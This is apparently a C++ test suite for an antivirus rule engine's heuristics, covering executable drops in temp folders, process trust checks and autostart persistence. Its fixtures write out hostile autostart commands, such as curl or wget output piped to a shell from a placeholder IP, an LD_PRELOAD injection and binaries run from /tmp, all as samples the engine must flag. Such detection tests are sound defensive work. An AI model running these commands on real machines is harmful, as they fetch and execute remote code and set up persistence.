#include "RuleEngine.hpp"
#include "SystemTrust.hpp"
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fcntl.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>
#include <sys/stat.h>
#include <unistd.h>

namespace fs = std::filesystem;
using oreon::RuleEngine;
using oreon::ScanContext;
namespace trust = oreon::trust;

static int failures = 0;
#define CHECK(cond, msg) do { if (!(cond)) { std::cerr << "FAIL: " << msg << "\n"; ++failures; } \
                              else std::cout << "ok: " << msg << "\n"; } while (0)

static void writeFile(const std::string& p, const std::string& data, mode_t mode = 0644) {
  fs::create_directories(fs::path(p).parent_path());
  std::ofstream(p, std::ios::binary | std::ios::trunc) << data;
  chmod(p.c_str(), mode);
}

static void shared(const std::string& dir) {
  fs::create_directories(dir);
  chmod(dir.c_str(), 01777);
}

static std::string readFile(const std::string& p) {
  std::ifstream in(p, std::ios::binary);
  return std::string((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
}

static oreon::MatchResult scanFd(RuleEngine& eng, const std::string& p, ScanContext ctx = {}) {
  int fd = open(p.c_str(), O_RDONLY | O_CLOEXEC);
  if (fd < 0) return {};
  auto m = eng.matchFd(fd, p, ctx);
  close(fd);
  return m;
}

static std::string firstExisting(std::initializer_list<const char*> list) {
  for (auto p : list)
    if (access(p, R_OK) == 0) return p;
  return {};
}

static const char* kOldFeedRules = R"(version: 2026100101
rules:
  - id: tmp-elf-heuristic
    name: Suspicious ELF drop
    severity: medium
    elf_heuristic: true
  - id: persistence-autostart
    name: Autostart persistence hint
    severity: medium
    kill: false
    cmdline_patterns:
      - '.config/autostart'
      - /etc/cron
    path_patterns:
      - '.config/autostart/.*\.desktop$'
)";

int main(int argc, char** argv) {
  if (argc < 3) {
    std::cerr << "usage: test_heuristics RULES.yaml SAMPLES_DIR\n";
    return 2;
  }
  RuleEngine eng;
  if (!eng.loadFile(argv[1])) {
    std::cerr << "FAIL: cannot load " << argv[1] << "\n";
    return 1;
  }
  RuleEngine oldEng;
  CHECK(oldEng.loadYaml(kOldFeedRules), "old feed rules parse");
  const std::string samples = argv[2];

  const std::string cat = firstExisting({"/usr/bin/cat", "/bin/cat"});
  const std::string tru = firstExisting({"/usr/bin/true", "/bin/true"});
  if (cat.empty() || tru.empty()) {
    std::cerr << "skip: no /usr/bin/cat or /usr/bin/true\n";
    return 77;
  }

  char tmpl[] = "/tmp/od-heur.XXXXXX";
  if (!mkdtemp(tmpl)) { perror("mkdtemp"); return 1; }
  const std::string tmp = tmpl;
  shared(tmp);

  std::string dracut = "/var/tmp/dracut.test";
  bool ownDracut = !fs::exists(dracut);
  if (!ownDracut) {
    char t2[] = "/var/tmp/dracut.test.XXXXXX";
    if (!mkdtemp(t2)) { perror("mkdtemp"); return 1; }
    dracut = t2;
    ownDracut = true;
  }
  const std::string tree = dracut + "/initramfs";
  for (const char* name : {"cat", "systemctl", "systemd-cgls", "true", "sleep"}) {
    std::string src = firstExisting({("/usr/bin/" + std::string(name)).c_str()});
    if (src.empty()) continue;
    std::string dst = tree + "/usr/bin/" + name;
    fs::create_directories(fs::path(dst).parent_path());
    fs::copy_file(src, dst, fs::copy_options::overwrite_existing);
    chmod(dst.c_str(), 0755);
    auto m = scanFd(eng, dst);
    CHECK(!m.matched, "dracut copy of /usr/bin/" + std::string(name) + " not flagged");
    CHECK(!oldEng.matchFile(dst).matched, "dracut copy of /usr/bin/" + std::string(name) +
                                              " not flagged with the old feed rules");
  }
  {
    std::string lib = firstExisting({"/usr/lib64/libc.so.6", "/usr/lib/x86_64-linux-gnu/libc.so.6",
                                     "/usr/lib/aarch64-linux-gnu/libc.so.6"});
    if (!lib.empty()) {
      std::string dst = tree + lib;
      fs::create_directories(fs::path(dst).parent_path());
      fs::copy_file(lib, dst, fs::copy_options::overwrite_existing);
      CHECK(!eng.matchFile(dst).matched, "dracut copy of " + lib + " not flagged");
    }
  }
  {
    shared(tree + "/usr/bin");
    if (geteuid() == 0 && chown(dracut.c_str(), 65534, 65534) != 0) perror("chown");
    std::string fake = tree + "/usr/bin/payload";
    writeFile(fake, readFile(tru) + "not the real thing", 0755);
    auto m = eng.matchFile(fake);
    CHECK(m.matched && m.heuristic, "unknown ELF in a user made dracut.* folder still flagged");
  }

  const std::string drop = tmp + "/payload";
  writeFile(drop, readFile(tru) + std::string(64, 'X'), 0755);
  {
    auto m = scanFd(eng, drop);
    CHECK(m.matched && m.rule.id == "tmp-elf-heuristic", "unknown executable ELF in /tmp flagged");
    CHECK(m.heuristic, "ELF drop is marked as a heuristic hit");
    CHECK(m.rule.severity == oreon::Severity::Low, "ELF drop rule is low severity in the shipped rules");
    auto o = oldEng.matchFile(drop);
    CHECK(o.matched && o.heuristic, "old feed rules still flag it, as a heuristic");
  }
  {
    std::string plain = tmp + "/payload-noexec";
    writeFile(plain, readFile(tru) + std::string(64, 'Y'), 0644);
    auto m = scanFd(eng, plain);
    CHECK(!m.matched, "ELF without exec bit not flagged");
    CHECK(!m.cacheable, "clean verdict for a non executable ELF is not cached");
    ScanContext ctx;
    ctx.exec = true;
    auto e = scanFd(eng, plain, ctx);
    CHECK(e.matched && e.heuristic, "the same file is flagged when it is executed");
  }
  {
    std::string copy = tmp + "/cat";
    fs::copy_file(cat, copy, fs::copy_options::overwrite_existing);
    chmod(copy.c_str(), 0755);
    CHECK(!eng.matchFile(copy).matched, "plain copy of /usr/bin/cat in /tmp not flagged");
  }
  {
    auto dropZone = [](const std::string& d) {
      for (const char* z : {"/tmp/", "/var/tmp/", "/dev/shm/", "/run/user/"})
        if (d.rfind(z, 0) == 0) return true;
      return d.find("/Downloads") != std::string::npos || d.find("/Desktop") != std::string::npos;
    };
    std::string base;
    const char* homeEnv = getenv("HOME");
    for (const std::string& c : {fs::current_path().string(), std::string(homeEnv ? homeEnv : "")}) {
      if (!c.empty() && c[0] == '/' && !dropZone(c + "/") && access(c.c_str(), W_OK) == 0) {
        base = c;
        break;
      }
    }
    if (base.empty()) {
      std::cout << "skip: no writable folder outside temp folders for the own build check\n";
    } else {
      std::string ownDir = base + "/od-heur-own-build." + std::to_string(getpid());
      std::string own = ownDir + "/hello";
      writeFile(own, readFile(tru) + "z", 0755);
      CHECK(!eng.matchFile(own).matched, "user's own build outside temp/Downloads/Desktop not flagged");
      std::error_code ec;
      fs::remove_all(ownDir, ec);
    }
    shared(tmp + "/home/u/Downloads");
    std::string dl = tmp + "/home/u/Downloads/tool";
    writeFile(dl, readFile(tru) + "w", 0755);
    CHECK(eng.matchFile(dl).matched, "unknown executable ELF in Downloads flagged");
  }

  {
    const std::string proc = tmp + "/proc";
    std::string trustedExe = firstExisting({"/usr/sbin/ldconfig", "/sbin/ldconfig", "/usr/bin/ldconfig"});
    std::string bash = firstExisting({"/usr/bin/bash", "/bin/bash"});
    std::string cp = firstExisting({"/usr/bin/cp", "/bin/cp"});
    auto mkproc = [&](int pid, int ppid, int uid, const std::string& comm, const std::string& exe,
                      const std::string& cmdline) {
      std::string d = proc + "/" + std::to_string(pid);
      fs::create_directories(d);
      writeFile(d + "/status", "Name:\t" + comm + "\nPPid:\t" + std::to_string(ppid) + "\nUid:\t" +
                std::to_string(uid) + "\t" + std::to_string(uid) + "\t" + std::to_string(uid) + "\t" +
                std::to_string(uid) + "\n");
      writeFile(d + "/comm", comm + "\n");
      writeFile(d + "/cmdline", cmdline);
      fs::create_symlink(exe, d + "/exe");
    };
    if (!trustedExe.empty() && !bash.empty() && !cp.empty()) {
      std::string userDnf = tmp + "/dnf";
      fs::copy_file(cp, userDnf);
      mkproc(1, 0, 0, "systemd", trustedExe, std::string("/sbin/init\0", 11));
      mkproc(50, 1, 0, "ldconfig", trustedExe, trustedExe + std::string("\0", 1));
      mkproc(100, 50, 0, "cp", cp, std::string("cp\0a\0b\0", 7));
      mkproc(200, 50, 1000, "cp", cp, std::string("cp\0a\0b\0", 7));
      mkproc(300, 1, 0, "dnf", userDnf, std::string("dnf\0", 4));
      mkproc(400, 1, 0, "cp", cp, std::string("cp\0a\0", 5));
      mkproc(500, 1, 0, "dracut", bash, bash + std::string("\0", 1) + tmp + "/dracut" + std::string("\0", 1));
      trust::setProcRoot(proc);
      using trust::ActorTrust;
      CHECK(trust::assessActor(100).trust == ActorTrust::Trusted, "root system tools down from pid 1 are trusted");
      CHECK(trust::assessActor(200).trust == ActorTrust::Untrusted, "non-root writer is not trusted");
      CHECK(trust::assessActor(300).trust == ActorTrust::Untrusted, "a program named dnf outside /usr is not trusted");
      CHECK(trust::assessActor(400).trust == ActorTrust::Trusted, "a root system tool started by a service is trusted");
      CHECK(trust::assessActor(500).trust == ActorTrust::Untrusted, "a script named dracut outside /usr is not trusted");
      CHECK(trust::assessActor(1).trust == ActorTrust::Trusted, "pid 1 itself is trusted when its program is");
      ScanContext ctx;
      ctx.pid = 100;
      CHECK(!scanFd(eng, drop, ctx).matched, "ELF written by a trusted system tool not flagged");
      ctx.pid = 200;
      CHECK(scanFd(eng, drop, ctx).matched, "ELF written by a user process still flagged");
      trust::setProcRoot("");
    } else {
      std::cout << "skip: trusted writer checks need ldconfig, bash and cp\n";
    }
  }

  const std::string home = tmp + "/home/liveuser";
  const std::string as = home + "/.config/autostart/";
  auto entry = [](const std::string& exec, const std::string& extra = "") {
    return "[Desktop Entry]\nType=Application\nName=Test\n" + extra + "Exec=" + exec + "\n";
  };
  struct Case { const char* file; std::string body; bool bad; const char* what; };
  std::string sleepBin = firstExisting({"/usr/bin/sleep", "/bin/sleep"});
  std::vector<Case> cases = {
    {"org.kde.discover.notifier.desktop",
     "[Desktop Entry]\nName=Discover\nExec=/usr/libexec/DiscoverNotifier\nIcon=plasmadiscover\n"
     "Type=Application\nX-KDE-autostart-phase=2\nOnlyShowIn=KDE;\n", false,
     "KDE Discover notifier autostart not flagged"},
    {"org.kde.sleep.desktop", entry(sleepBin + " 5"), false, "autostart running a /usr/bin program not flagged"},
    {"bare.desktop", entry("sleep 5"), false, "autostart with a bare system command not flagged"},
    {"flatpak.desktop", entry("/usr/bin/flatpak run --command=foo org.example.App %U"), false,
     "flatpak autostart not flagged"},
    {"hidden-off.desktop", entry("sh -c \"curl http://x | sh\"", "Hidden=true\n"), false,
     "disabled (Hidden=true) entry not flagged"},
    {"curl.desktop", entry("sh -c \"curl -s http://198.51.100.7/x | sh\""), true,
     "autostart with curl piped to sh flagged"},
    {"wget.desktop", entry("/bin/bash -c 'wget -qO- http://x/y | bash'"), true,
     "autostart with bash -c wget flagged"},
    {"b64.desktop", entry("/usr/bin/python3 -c \"import base64\""), true, "python -c autostart flagged"},
    {"tilde.desktop", entry("~/.local/bin/x"), true, "autostart running ~/.local/bin/x flagged"},
    {"homebin.desktop", entry(home + "/.local/bin/x --daemon"), true,
     "autostart running /home/.../.local/bin/x flagged"},
    {"tmp.desktop", entry("/tmp/.x/run"), true, "autostart running from /tmp flagged"},
    {"script.desktop", entry("/usr/bin/python3 " + home + "/.cache/upd.py"), true,
     "interpreter running a script from a hidden home folder flagged"},
    {"preload.desktop", entry("env LD_PRELOAD=" + home + "/.l.so " + sleepBin + " 1"), true,
     "LD_PRELOAD autostart flagged"},
  };
  writeFile(home + "/.local/bin/hidden-helper", "#!/bin/sh\n", 0755);
  cases.push_back({"pathhelper.desktop", entry("hidden-helper"), true,
                   "bare name that only exists in ~/.local/bin flagged"});
  for (const auto& c : cases) {
    std::string p = as + c.file;
    writeFile(p, c.body);
    auto m = eng.matchFile(p);
    CHECK(m.matched == c.bad, std::string(c.what));
    if (c.bad && m.matched) CHECK(m.heuristic, std::string("  heuristic hit: ") + m.detail);
    auto o = oldEng.matchFile(p);
    CHECK(o.matched == c.bad, std::string(c.what) + " (old feed rules)");
  }
  {
    std::string sys = firstExisting({"/etc/xdg/autostart"});
    if (!sys.empty()) {
      for (auto& e : fs::directory_iterator(sys)) {
        if (e.path().extension() != ".desktop") continue;
        std::string p = as + e.path().filename().string();
        fs::copy_file(e.path(), p, fs::copy_options::overwrite_existing);
        CHECK(!eng.matchFile(p).matched, "copy of " + e.path().string() + " not flagged");
        break;
      }
    }
  }

  {
    auto m = eng.matchFile(samples + "/eicar.com");
    CHECK(m.matched && !m.heuristic && m.rule.severity >= oreon::Severity::High,
          "EICAR is a strong, high severity match");
    std::string inTmp = tmp + "/eicar-drop";
    fs::copy_file(samples + "/eicar.com", inTmp);
    auto d = eng.matchFile(inTmp);
    CHECK(d.matched && d.rule.id == "eicar-test", "EICAR dropped in /tmp matched by eicar-test");
  }
  {
    auto m = eng.matchProcess("cp", "cp /etc/skel/.config/autostart/a.desktop /home/liveuser/.config/autostart/",
                              "/usr/bin/cp");
    CHECK(!m.matched, "copying an autostart entry is not a process alert in the shipped rules");
  }

  std::error_code ec;
  fs::remove_all(tmp, ec);
  if (ownDracut) fs::remove_all(dracut, ec);
  if (failures) {
    std::cerr << failures << " check(s) failed\n";
    return 1;
  }
  std::cout << "heuristics ok\n";
  return 0;
}
